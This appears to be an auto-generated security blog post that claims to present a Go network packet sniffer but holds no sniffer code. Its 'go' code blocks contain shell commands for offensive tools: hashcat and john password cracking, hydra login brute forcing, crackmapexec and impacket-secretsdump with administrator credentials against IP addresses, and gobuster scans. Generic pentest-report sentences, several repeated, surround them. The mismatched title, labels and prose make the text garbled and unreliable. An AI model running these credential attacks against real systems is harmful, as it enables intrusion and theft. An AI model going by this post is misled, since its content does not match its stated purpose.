---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "rust, python, fuzzer, parser, powershell, go"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-656.html"
URL_IMAGES: ""
Date: "2024-07-23"
Tags: "Rust, Python, Fuzzer, Parser, PowerShell, Go"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-656"
Permalink: "/scripting/script-network-packet-sniffer-656.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `mimikatz`
- `enum4linux`
- `psexec`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.32.166 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.64.203.210 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.111.200.27/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.125.169.67 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.124.84
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```bash
feroxbuster -h
gobuster dir -u http://10.104.171.234/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 27.24s
```
